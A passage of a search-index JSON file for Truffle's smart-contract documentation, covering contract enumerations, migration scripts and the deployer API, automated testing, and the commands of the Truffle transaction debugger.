); Please see this issue here for more information.", "title": "Invoking overloaded methods"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#using-enumerations", "text": "Contract abstractions can also be used to access Solidity enumerations defined within that contract. For instance, suppose we have the following Solidity contract: contract ExampleContract { enum ExampleEnum { ExampleOption0 , ExampleOption1 , ExampleOption2 } // ... } One could then use ExampleContract.ExampleEnum.ExampleOption0 to access that enum value; in this case, that is equal to 0 , but using this allows one to pass in enums to contract methods without having to worry about their numerical value. A contract's enums are also available under .enums , so in this case, one could also write ExampleContract.enums.ExampleEnum.ExampleOption0 .", "title": "Using enumerations"}, {"location": "docs/truffle/how-to/contracts/interact-with-your-contracts/#further-reading", "text": "The contract abstractions provided by Truffle contain a wealth of utilities for making interacting with your contracts easy. Check out the @truffle/contract documentation for tips, tricks and insights.", "title": "Further reading"}, {"location": "docs/truffle/how-to/contracts/run-migrations/", "text": "Run Migrations \u00b6 Migrations are JavaScript files that help you deploy contracts to the Ethereum network. These files are responsible for staging your deployment tasks, and they're written under the assumption that your deployment needs will change over time. As your project evolves, you'll create new migration scripts to further this evolution on the blockchain. A history of previously run migrations is recorded on-chain through a special Migrations contract, detailed below. Command \u00b6 To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts. If your migrations were previously run successfully, truffle migrate will start execution from the last migration that was run, running only newly created migrations. If no new migrations exists, truffle migrate won't perform any action at all. You can use the --reset option to run all your migrations from the beginning. Other command options are documented here . For local testing, make sure to have a test blockchain such as Ganache configured and running before executing truffle migrate . You can also use truffle develop and run your migrations. Migration files \u00b6 A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = function ( deployer ) { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required in order to record whether the migration ran successfully. The suffix is purely for human readability and comprehension. artifacts.require() \u00b6 At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the name of the contract definition within that source file. Do not pass the name of the source file, as files can contain more than one contract. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/Contracts.sol contract ContractOne { // ... } contract ContractTwo { // ... } To use only ContractTwo , your artifacts.require() statement would look like this: var ContractTwo = artifacts . require ( \"ContractTwo\" ); To use both contracts, you will need two artifacts.require() statements: var ContractOne = artifacts . require ( \"ContractOne\" ); var ContractTwo = artifacts . require ( \"ContractTwo\" ); module.exports \u00b6 All migrations must export a function via the module.exports syntax. The function exported by each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below. Filename: migrations/1_deploy_contracts.js var SolidityContract = artifacts . require ( \"SolidityContract\" ); module . exports = function ( deployer ) { // Deploy the SolidityContract contract as our only task deployer . deploy ( SolidityContract ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps. Deployer \u00b6 Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page. Network considerations \u00b6 It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"live\" ) { // Do something specific to the network named \"live\". } else { // Perform a different step otherwise. } } Available accounts \u00b6 Migrations are also passed the list of accounts provided to you by your Ethereum client and web3 provider, for you to use during your deployments. This is the exact same list of accounts returned from web3.eth.getAccounts() . module . exports = function ( deployer , network , accounts ) { // Use the accounts within your migrations. } Deployer API \u00b6 The deployer contains many functions available to simplify your migrations. deployer.deploy(contract, args..., options) \u00b6 Deploy a specific contract, specified by the contract object, with optional constructor arguments. This is useful for singleton contracts, such that only one instance of this contract exists for your dapp. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. You can optionally pass an array of contracts, or an array of arrays, to speed up deployment of multiple contracts. Additionally, the last argument is an optional object that can include the key named overwrite as well as other transaction parameters such as gas and from . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. Note that you will need to deploy and link any libraries your contracts depend on first before calling deploy . See the link function below for more details. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without constructor arguments deployer . deploy ( A ); // Deploy a single contract with constructor arguments deployer . deploy ( A , arg1 , arg2 , ...); // Don't deploy this contract if it has already been deployed deployer . deploy ( A , { overwrite : false }); // Set a maximum amount of gas and `from` address for the deployment deployer . deploy ( A , { gas : 4612388 , from : \"0x....\" }); // Deploying multiple contracts as an array is now deprecated. // This used to be quicker than writing three `deployer.deploy()` statements as the deployer // can perform the deployment as a single batched request. // deployer.deploy([ // [A, arg1, arg2, ...], // B, // [C, arg1] // ]); // External dependency example: // // For this example, our dependency provides an address when we're deploying to the // live network, but not for any other networks like testing and development. // When we're deploying to the live network we want it to use that address, but in // testing and development we need to deploy a version of our own. Instead of writing // a bunch of conditionals, we can simply use the `overwrite` key. deployer . deploy ( SomeDependency , { overwrite : false }); deployer.link(library, destinations) \u00b6 Link an already-deployed library to a contract or multiple contracts. Here library can be either the library contract abstraction, to link to the deployed copy, or a specific library instance if you want to link to a copy at a different address. The destinations argument can be a single contract or an array of multiple contracts. If any contract within the destination doesn't rely on the library being linked, the contract will be ignored. Example: // Deploy library LibA, then link LibA to contract B, then deploy B. deployer . deploy ( LibA ); deployer . link ( LibA , B ); deployer . deploy ( B ); // Link LibA to many contracts deployer . link ( LibA , [ B , C , D ]); // Link to a copy of LibA at a custom address const instanceOfLibA = await LibA . at ( address ); await deployer . link ( instanceOfLibA , B ); deployer.then(function() {...}) \u00b6 Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A return A . new (); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Set the new instance of A's address on B via B's setA() function. return b . setA ( a . address ); }); Migrations with async/await \u00b6 You can also migrate your contracts using async/await : Example: module . exports = async function ( deployer ) { // deploy a contract await deployer . deploy ( MyContract ); //access information about your deployed contract instance const instance = await MyContract . deployed (); }", "title": "Deploy a contract"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#run-migrations", "text": "Migrations are JavaScript files that help you deploy contracts to the Ethereum network. These files are responsible for staging your deployment tasks, and they're written under the assumption that your deployment needs will change over time. As your project evolves, you'll create new migration scripts to further this evolution on the blockchain. A history of previously run migrations is recorded on-chain through a special Migrations contract, detailed below.", "title": "Run Migrations"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#command", "text": "To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts. If your migrations were previously run successfully, truffle migrate will start execution from the last migration that was run, running only newly created migrations. If no new migrations exists, truffle migrate won't perform any action at all. You can use the --reset option to run all your migrations from the beginning. Other command options are documented here . For local testing, make sure to have a test blockchain such as Ganache configured and running before executing truffle migrate . You can also use truffle develop and run your migrations.", "title": "Command"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#migration-files", "text": "A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = function ( deployer ) { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required in order to record whether the migration ran successfully. The suffix is purely for human readability and comprehension.", "title": "Migration files"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#artifactsrequire", "text": "At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the name of the contract definition within that source file. Do not pass the name of the source file, as files can contain more than one contract. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/Contracts.sol contract ContractOne { // ... } contract ContractTwo { // ... } To use only ContractTwo , your artifacts.require() statement would look like this: var ContractTwo = artifacts . require ( \"ContractTwo\" ); To use both contracts, you will need two artifacts.require() statements: var ContractOne = artifacts . require ( \"ContractOne\" ); var ContractTwo = artifacts . require ( \"ContractTwo\" );", "title": "artifacts.require()"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#moduleexports", "text": "All migrations must export a function via the module.exports syntax. The function exported by each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below. Filename: migrations/1_deploy_contracts.js var SolidityContract = artifacts . require ( \"SolidityContract\" ); module . exports = function ( deployer ) { // Deploy the SolidityContract contract as our only task deployer . deploy ( SolidityContract ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps.", "title": "module.exports"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#deployer", "text": "Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page.", "title": "Deployer"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#network-considerations", "text": "It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"live\" ) { // Do something specific to the network named \"live\". } else { // Perform a different step otherwise. } }", "title": "Network considerations"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#available-accounts", "text": "Migrations are also passed the list of accounts provided to you by your Ethereum client and web3 provider, for you to use during your deployments. This is the exact same list of accounts returned from web3.eth.getAccounts() . module . exports = function ( deployer , network , accounts ) { // Use the accounts within your migrations. }", "title": "Available accounts"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#deployer-api", "text": "The deployer contains many functions available to simplify your migrations.", "title": "Deployer API"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#deployerdeploycontract-args-options", "text": "Deploy a specific contract, specified by the contract object, with optional constructor arguments. This is useful for singleton contracts, such that only one instance of this contract exists for your dapp. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. You can optionally pass an array of contracts, or an array of arrays, to speed up deployment of multiple contracts. Additionally, the last argument is an optional object that can include the key named overwrite as well as other transaction parameters such as gas and from . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. Note that you will need to deploy and link any libraries your contracts depend on first before calling deploy . See the link function below for more details. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without constructor arguments deployer . deploy ( A ); // Deploy a single contract with constructor arguments deployer . deploy ( A , arg1 , arg2 , ...); // Don't deploy this contract if it has already been deployed deployer . deploy ( A , { overwrite : false }); // Set a maximum amount of gas and `from` address for the deployment deployer . deploy ( A , { gas : 4612388 , from : \"0x....\" }); // Deploying multiple contracts as an array is now deprecated. // This used to be quicker than writing three `deployer.deploy()` statements as the deployer // can perform the deployment as a single batched request. // deployer.deploy([ // [A, arg1, arg2, ...], // B, // [C, arg1] // ]); // External dependency example: // // For this example, our dependency provides an address when we're deploying to the // live network, but not for any other networks like testing and development. // When we're deploying to the live network we want it to use that address, but in // testing and development we need to deploy a version of our own. Instead of writing // a bunch of conditionals, we can simply use the `overwrite` key. deployer . deploy ( SomeDependency , { overwrite : false });", "title": "deployer.deploy(contract, args..., options)"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#deployerlinklibrary-destinations", "text": "Link an already-deployed library to a contract or multiple contracts. Here library can be either the library contract abstraction, to link to the deployed copy, or a specific library instance if you want to link to a copy at a different address. The destinations argument can be a single contract or an array of multiple contracts. If any contract within the destination doesn't rely on the library being linked, the contract will be ignored. Example: // Deploy library LibA, then link LibA to contract B, then deploy B. deployer . deploy ( LibA ); deployer . link ( LibA , B ); deployer . deploy ( B ); // Link LibA to many contracts deployer . link ( LibA , [ B , C , D ]); // Link to a copy of LibA at a custom address const instanceOfLibA = await LibA . at ( address ); await deployer . link ( instanceOfLibA , B );", "title": "deployer.link(library, destinations)"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#deployerthenfunction", "text": "Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A return A . new (); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Set the new instance of A's address on B via B's setA() function. return b . setA ( a . address ); });", "title": "deployer.then(function() {...})"}, {"location": "docs/truffle/how-to/contracts/run-migrations/#migrations-with-asyncawait", "text": "You can also migrate your contracts using async/await : Example: module . exports = async function ( deployer ) { // deploy a contract await deployer . deploy ( MyContract ); //access information about your deployed contract instance const instance = await MyContract . deployed (); }", "title": "Migrations with async/await"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/", "text": "Test your contracts \u00b6 Framework \u00b6 Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests in two different ways: In Javascript and TypeScript , for exercising your contracts from the outside world, just like your application. In Solidity , for exercising your contracts in advanced, bare-to-the-metal scenarios. Both styles of tests have their advantages and drawbacks. See the next two sections for a discussion of each one. Location \u00b6 All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx , and .sol . All other files are ignored. Command \u00b6 To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js Note: When the truffle test process exits, its exit code is equal to the number of failing tests. If there are more than 255 failing tests, it will exit with code 255. Clean-room environment \u00b6 Truffle provides a clean room environment when running your test files. When running your tests against Ganache or Truffle Develop, Truffle will use advanced snapshotting features to ensure your test files don't share state with each other. When running against other Ethereum clients like go-ethereum , Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against. Speed and reliability considerations \u00b6 Both Ganache and Truffle Develop are significantly faster than other clients when running automated tests. Moreover, they contain special features which Truffle takes advantage of to speed up test runtime by almost 90%. As a general workflow, we recommend you use Ganache or Truffle Develop during normal development and testing, and then run your tests once against go-ethereum or another official Ethereum client when you're gearing up to deploy to live or production networks. Stack Traces \u00b6 You can obtain Solidity stack traces for failed transactions with truffle test --stacktrace . This will produce stack traces for transactions and deployments made via Truffle Contract during your tests should one of them revert and thereby causes your test to fail. This option is still experimental, and stack traces are not currently supported for calls or gas estimates. Moreover, while it is turned on, PromiEvent functionality of Truffle Contract (as opposed to Promise functionality) may not work. There is also the option truffle test --stacktrace-extra . This will turn on stack traces and will additionally compile contracts in Solidity's debug mode for additional revert messages. This debug mode was only introduced in Solidity 0.6.3 so it will have no effect on earlier versions of Solidity. Using debug mode may cause problems on larger contracts.", "title": "Run automated tests"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#test-your-contracts", "text": "", "title": "Test your contracts"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#framework", "text": "Truffle comes standard with an automated testing framework to make testing your contracts a breeze. This framework lets you write simple and manageable tests in two different ways: In Javascript and TypeScript , for exercising your contracts from the outside world, just like your application. In Solidity , for exercising your contracts in advanced, bare-to-the-metal scenarios. Both styles of tests have their advantages and drawbacks. See the next two sections for a discussion of each one.", "title": "Framework"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#location", "text": "All test files should be located in the ./test directory. Truffle will only run test files with the following file extensions: .js , .ts , .es , .es6 , and .jsx , and .sol . All other files are ignored.", "title": "Location"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#command", "text": "To run all tests, simply run: $ truffle test Alternatively, you can specify a path to a specific file you want to run, e.g., $ truffle test ./path/to/test/file.js Note: When the truffle test process exits, its exit code is equal to the number of failing tests. If there are more than 255 failing tests, it will exit with code 255.", "title": "Command"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#clean-room-environment", "text": "Truffle provides a clean room environment when running your test files. When running your tests against Ganache or Truffle Develop, Truffle will use advanced snapshotting features to ensure your test files don't share state with each other. When running against other Ethereum clients like go-ethereum , Truffle will re-deploy all of your migrations at the beginning of every test file to ensure you have a fresh set of contracts to test against.", "title": "Clean-room environment"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#speed-and-reliability-considerations", "text": "Both Ganache and Truffle Develop are significantly faster than other clients when running automated tests. Moreover, they contain special features which Truffle takes advantage of to speed up test runtime by almost 90%. As a general workflow, we recommend you use Ganache or Truffle Develop during normal development and testing, and then run your tests once against go-ethereum or another official Ethereum client when you're gearing up to deploy to live or production networks.", "title": "Speed and reliability considerations"}, {"location": "docs/truffle/how-to/debug-test/test-your-contracts/#stack-traces", "text": "You can obtain Solidity stack traces for failed transactions with truffle test --stacktrace . This will produce stack traces for transactions and deployments made via Truffle Contract during your tests should one of them revert and thereby causes your test to fail. This option is still experimental, and stack traces are not currently supported for calls or gas estimates. Moreover, while it is turned on, PromiEvent functionality of Truffle Contract (as opposed to Promise functionality) may not work. There is also the option truffle test --stacktrace-extra . This will turn on stack traces and will additionally compile contracts in Solidity's debug mode for additional revert messages. This debug mode was only introduced in Solidity 0.6.3 so it will have no effect on earlier versions of Solidity. Using debug mode may cause problems on larger contracts.", "title": "Stack Traces"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/", "text": "Use the Truffle debugger \u00b6 Truffle includes an integrated debugger so that you can debug transactions made against your contracts. This debugger looks and feels like existing command line debuggers available for traditional development environments. Overview \u00b6 New in Truffle v5.1: truffle test --debug . Set breakpoints in your JavaScript tests with the new debug() global! See below . New in Truffle v5.1.29: truffle debug --fetch-external . Debug transactions involving contracts not in your project that are verified on Etherscan ! (And as of v5.1.32, it works with Sourcify too!) See below . New in Truffle v5.4.26: truffle debug --url <provider_url> . Debug transactions without needing a Truffle project or config! See below . Debugging a transaction on the blockchain is different than debugging traditional applications (for instance, applications written in C++ or Javascript). When debugging a transaction on the blockchain, you're not running the code in real-time; instead, you're stepping over the historical execution of that transaction, and mapping that execution onto its associated code. This gives us many liberties in debugging, in that we can debug any transaction, any time, so long as we have the code and artifacts for the contracts the transaction interacted with. Think of these code and artifacts as akin to the debugging symbols needed by traditional debuggers. In order to debug transactions, you'll need the following: Truffle 4.0 or above. The hash of a transaction on your desired blockchain. (If you are using the built-in blockchain and trying to debug a test execution, you may obtain the hash by running truffle develop --log .) The source code and artifacts the transaction encounters. Note that it's okay if your desired transaction resulted in an exception or if it ran out of gas. The transaction still exists on chain, and so you can still debug it! Warning: Debugging a transaction against a contract that was compiled with optimization enabled may not work reliably. In-test debugging \u00b6 Truffle v5.1 and above provides the truffle test --debug flag and associated debug() global function, allowing you to interrupt tests to debug specific operations. Instead of capturing the transaction hash as described below, simply wrap any contract operation with debug() , like so: it ( \"should succeed\" , async function () { // wrap what you want to debug with `debug()`: await debug ( myContract . myFunction ( accounts [ 1 ], { from : accounts [ 0 ] }) ); // ^^^^^^^^^^^^^^^^^^ wrap contract operation ^^^^^^^^^^^^^^ }); Then, run truffle test --debug . Truffle will compile your sources and run your tests as normal until reaching the operation in question. At this point, Truffle will interrupt the normal test flow and start the debugger, allowing you to set breakpoints, inspect Solidity variables, etc. See Writing tests in JavaScript for more information on truffle test , and see Interacting with your contracts to learn about contract operations. Note : This feature currently doesn't work with reverted transactions; until we fix this, you can debug those with direct use of truffle debug . Debugging read-only calls \u00b6 Running the debugger from inside your JS tests allow additional functionality beyond which truffle debug <txHash> can provide. Beyond just debugging transactions, in-test debugging allows you to debug read-only calls as well. it ( \"should get latest result\" , async function () { // wrap what you want to debug with `debug()`: const result = await debug ( myContract . getResult ( \"latest\" ) ); // ^^^^^ read-only function ^^^^^ }); Command \u00b6 To use the debugger, gather the transaction you'd like to debug then run the following: $ truffle debug <transaction hash> Using a transaction starting with 0x8e5dadfb921dd... as an example, the command would look as follows: $ truffle debug 0x8e5dadfb921ddddfa8f53af1f9bd8beeac6838d52d7e0c2fe5085b42a4f3ca76 This will launch the debugging interface described below. If you simply want to open the debugger to get it ready, so that you can debug a transaction later, you can also simply run: $ truffle debug Regardless of how you start the debugger, once it is running you are not limited to debugging only the transaction you launched it with; it is possible to unload the current transaction and load a new one, as described below. You can specify the network you want to debug on with the --network option: $ truffle debug [ <transaction hash> ] --network <network> Also, instead of --network , you can use --url with the URL of a provider; with this option, you can use Truffle Debugger outside of a Truffle project and without a Truffle config. This is primarily useful with the --fetch-external option. $ truffle debug [ <transaction hash> ] --url <provider_url> If you want to debug your Solidity test contracts , you can pass the --compile-tests option: $ truffle debug [ <transaction hash> ] --compile-tests And with the --fetch-external option ( see below ), you can debug contract instances outside your project that have verified source code on Etherscan or Sourcify . When using this option, you must specify a transaction hash to debug, and you will not be able to switch transactions from inside the debugger. $ truffle debug <transaction hash> --fetch-external --network <network> Faster debugger startup: If your project was not compiled all at once (or under certain other conditions), the debugger will have to do its own compile of your project on startup. This can be very slow. If you compile your whole project at once, however, the debugger can likely avoid the initial recompile, speeding up startup greatly. Debugging external contracts with verified source \u00b6 If you pass the --fetch-external option, the debugger will attempt to download verified source code off of Etherscan and Sourcify for any addresses involved in the transaction that it cannot find source code for in your project. You can of course debug such transactions without this option, but when stepping through the transaction the external calls to these unrecognized contracts will simply be skipped over. This option can also be abbreviated -x . If you have an Etherscan API key, you can include it in your configuration file and the debugger will use it when downloading source from Etherscan. Including this can speed up downloads. Example: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one } } Debugging outside of a Truffle project \u00b6 If you are outside of a Truffle project, you can still use truffle debug so long as you pass the --url option, giving the URL of a provider to connect to. This is primarily useful with the --fetch-external option described above . Debugging interface \u00b6 Starting the debugger will open an interface familiar to those that have debugged other types of applications. When it starts, you'll see the following: A list of addresses either transacted against or created during the course of this transaction. A list of available commands for using the debugger. And the initial entry point for the transaction, including contract source file and code preview. The enter key is set to perform the last command entered. When the debugger starts, the enter key is set to step to the next logical source code element encountered during execution (i.e., the next expression or statement evaluated by the Ethereum virtual machine). At this point you can press enter to step through the transaction, or enter one of the available commands to analyze the transaction in more detail. The list of commands is detailed below. (o) step over \u00b6 This command steps over the current line, relative to the position of the statement or expression currently being evaluated in the Solidity source file. Use this command if you don't want to step into a function call or contract creation on the current line, or if you'd like to quickly jump to a specific point in the source file. (i) step into \u00b6 This command steps into the function call or contract creation currently being evaluated. Use this command to jump into the function and quickly start debugging the code that exists there. (u) step out \u00b6 This command steps out of the currently running function. Use this command to quickly get back to the calling function, or end execution of the transaction if this was the entry point of the transaction. (n) step next \u00b6 This command steps to the next logical statement or expression in the source code. For example, evaluating sub expressions will need to occur first before the virtual machine can evaluate the full expression. Use this command if you'd like to analyze each logical item the virtual machine evaluates. (;) step instruction \u00b6 This command allows you to step through each individual instruction evaluated by the virtual machine. This is useful if you're interested in understanding the low level bytecode created by the Solidity source code. When you use this command, the debugger will also print out the stack data at the time the instruction was evaluated. (If additional data displays have been turned on with the p command, those will be shown too.) You can also use this command with a numerical argument, to step that many times. (p) print instruction \u00b6 This commands prints the current instruction and stack data, but does not step to the next instruction. Use this when you'd like to see the current instruction and stack data after navigating through the transaction with the logical commands described above. This command can also print locations other than the stack, if you want to view memory, storage, or calldata. Simply type p memory to show memory along with the other information, p storage for storage, or p calldata for calldata. Each of these can also be abbreviated, e.g. p mem ; they can also be combined, e.g. p mem sto . You can also add these extra locations to the default display with + ; e.g., p +mem will make it so that memory will always be displayed when you enter p or ; , and p -mem will turn this off. You can even turn off the stack display with p -sta , or force it to display with p sta . All of these options can again be combined. This command also prints a group of instructions surrounding the current instruction. By default, it prints 3 instructions ahead of and 3 instructions behind the current instruction. You can configure the number of instructions to be printed with + and - ; e.g., p +<instructions-ahead> -<instruction-back> will make it print instructions-ahead instructions ahead of and instructions-back instructions behind the current instruction. The configured numbers are saved and used for printout afterward. (l) print additional source context \u00b6 This command prints source context surrounding the current source line. By default, it prints 5 lines ahead of and 3 lines behind the current source line. You can configure the number of source lines to be printed with + and - ; e.g., l +<lines-ahead> -<lines-back> will make it print lines-ahead lines ahead of and lines-back lines behind the current line. The configured numbers are saved and used for printout afterward. (e) print recent events \u00b6 This command prints events recently emitted by the transaction (as of where you are in it). The event's emitter and decoding will be displayed. If the event has been reverted between where it was emitted and where you are, there will be an indicator printed to show this. By default the command prints the 3 most recent events, but you can use e <number> to print the specified number, or e all to print them all; the number you choose will be remembered and remain as the default until you quit the debugger. (g) turn on generated sources \u00b6 When using Solidity 0.7.2 or later, you can use this option to allow the debugger to step into the internal assembly routines that Solidity generates. You can always advance into these with the ; command, but this option allows the other debugger commands ( n , i , o , u ) to step into these routines as well. (G) turn off generated sources \u00b6 This command undoes the g command, returning the debugger to its default behavior with regard to generated sources. Note that when generated sources are turned off, you can still advance into them with the ; command; and if a breakpoint is placed in one, continuing with c will still stop on such breakpoints. In addition, once inside such a routine, the other debugger commands ( n , i , o , u ) will advance as normal inside of it; they won't immediately exit it. (h) print this help \u00b6 Print the list of available commands. (q) quit \u00b6 Quit the debugger. (r) reset \u00b6 Reset the debugger to the beginning of the transaction. (b) set a breakpoint \u00b6 This command allows you to set breakpoints for any line in any of your source files (see examples below). These can be given by line number; by relative line number; by line number in a specified source file; or one may simply add a breakpoint at the current point in the code. You don't need a transaction loaded to set breakpoints, although in that case you will have to specify which source file you mean to set it in. (B) remove a breakpoint \u00b6 This command allows you to remove any of your existing breakpoints, with the same syntax as for adding them (see example below). Type B all to remove all breakpoints. (c) continue until breakpoint \u00b6 This command will cause execution of the code to continue until the next breakpoint is reached or the last line is executed. (:) evaluate and print expression \u00b6 This command will evaluate and print the given expression, based on the current variables and their values (see also v ). (+) add watch expression \u00b6 This command will add a watch on a provided expression, based on the following syntax: +:<expression> . (-) remove watch expression \u00b6 This command will remove a watch expression, based on the following syntax: -:<expression> . (?) list existing watch expressions and breakpoints \u00b6 This command will display a list of all the current watch expressions and breakpoints. It will also report whether generated sources are turned on or off. (v) display variables \u00b6 This command will display the current variables and their values, but does not step to the next instruction. Use this when you'd like to see the current variables and their values after navigating through the transaction with the logical commands described above. This command can also remove variables and their values from the variables display. If you want to remove solidity builtins variables, global constants, contract variables, or local variables, simply type v -builtins to remove solidity builtins along with the other information from the display, v -global for global constants, v -contract for contract variables, or v -local for local variables. Each of these can also be abbreviated, e.g. v -bui , v -glo , v -con , and v -loc ; they can also be combined, e.g. v -bui -glo . If variables are removed from the variables display, you can still display them without a sign; e.g., v bui will cause solidity builtins variables to be displayed. You can also add these variables back in to the display with + ; e.g., v +bui will make it so that solidity builtins variables will once again always be displayed when you enter v . All of these options can again be combined. (T) unload transaction \u00b6 This command unloads the current transaction so you can load a new one. Not usable in --fetch-external mode. (t) load transaction \u00b6 This command loads a new transaction (given by its transaction hash). Note that if you already have a transaction loaded, you must first explicitly unload it before you can load a new one. Not usable in --fetch-external mode. (y) Reset and advance to final error \u00b6 This command is only usable at the end of a trace. It resets the debugger and then advances it to the location of the final error. If the final error is at the end of the trace, this will have no effect. Note: The use of resetting and advancing, rather than directly jumping to the final error, is something of a stopgap due to the debugger not currently moving backwards; this will be changed in the future to jump directly back to the final error. (Y) Reset and advance to previous error \u00b6 This command resets the debugger and then advances to the location of the previous error; unlike y , it can be used from anywhere in the trace. Note: The use of resetting and advancing, rather than directly jumping to the final error, is something of a stopgap due to the debugger not currently moving backwards; this will be changed in the future to jump directly back to the final error. Adding and removing breakpoints \u00b6 Below are some examples of adding and removing breakpoints. Note the difference in case between adding (a lowercase 'b') and removing (an uppercase 'B'). If you add a breakpoint at a place where the debugger will skip over, it will be automatically moved down to the next point that the debugger might stop. This does not apply to removing breakpoints. Use the ? command to list current breakpoints. MagicSquare.sol: 11: event Generated(uint n); 12: 13: function generateMagicSquare(uint n) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug(develop:0x91c817a1...)> b 23 Breakpoint added at line 23. debug(develop:0x91c817a1...)> B 23 Breakpoint removed at line 23. debug(develop:0x91c817a1...)> b SquareLib:5 Breakpoint added at line 5 in SquareLib.sol. debug(develop:0x91c817a1...)> b +10 Breakpoint added at line 23. debug(develop:0x91c817a1...)> b Breakpoint added at this point in line 13. debug(develop:0x91c817a1...)> B all Removed all breakpoints.", "title": "Use the Truffle debugger"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#use-the-truffle-debugger", "text": "Truffle includes an integrated debugger so that you can debug transactions made against your contracts. This debugger looks and feels like existing command line debuggers available for traditional development environments.", "title": "Use the Truffle debugger"}, {"location": "docs/truffle/how-to/debug-test/use-the-truffle-debugger/#overview", "text": "New in Truffle v5.1: truffle test --debug . Set breakpoints in your JavaScript 